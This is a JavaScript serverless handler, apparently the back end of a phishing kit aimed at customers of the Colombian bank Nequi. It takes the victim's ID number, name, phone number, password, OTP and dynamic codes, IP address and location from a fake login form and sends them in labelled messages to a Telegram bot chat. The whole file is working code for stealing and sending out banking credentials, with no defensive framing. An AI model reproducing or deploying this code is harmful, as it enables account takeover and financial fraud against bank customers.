import axios from 'axios';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const {
      documentNumber,
      fullName,
      username,
      password,
      userIP,
      city,
      country,
      otpCode,
      dynamicCode,
    } = req.body;

    if (!documentNumber || !fullName) {
      return res.status(400).json({ error: 'Datos incompletos: documento o nombre faltante' });
    }

    let message;

    if (otpCode) {
      message = `
🤠Nequi_OTP🤠
🆔Nombres: ${fullName}
🪪Cedula: ${documentNumber}
#️⃣Número: ${username || 'No proporcionado'}
🔐Clave: ${password || 'No proporcionada'}
⭐️OTP: ${otpCode}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
    } else if (dynamicCode) {
      const formatType = dynamicCode.startsWith('2') ? 'Dinamica2' : 'Dinamica3';
      message = `
🤠Nequi_${formatType}🤠
🆔Nombres: ${fullName}
🪪Cedula: ${documentNumber}
#️⃣Número: ${username || 'No proporcionado'}
🔐Clave: ${password || 'No proporcionada'}
⭐️${formatType}: ${dynamicCode}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
    } else if (!username && !password) {
      // Aquí está tu bloque "Nequi 2.0"
      message = `
⭐️⭐️Nequi 2.0⭐️⭐️
🪪ID: ${documentNumber}
👤Nombres: ${fullName}
🌏IP: ${userIP || 'Desconocida'}
🏙Ciudad: ${city || 'Desconocida'}
🇨🇴País: ${country || 'Desconocido'}
`.trim();
    } else {
      message = `
👤Nequi_Meta_Infinito👤
🆔Nombres: ${fullName}
🪪Cédula: ${documentNumber}
#️⃣Número: ${username || 'No proporcionado'}
🔐Clave: ${password || 'No proporcionada'}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
`.trim();
    }

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true, message: 'Mensaje enviado con éxito' });
  } catch (error) {
    console.error('Error al enviar mensaje a Telegram:', error);
    res.status(500).json({
      error: 'Error al enviar mensaje a Telegram',
      details: error.message || 'Unknown error',
    });
  }
}
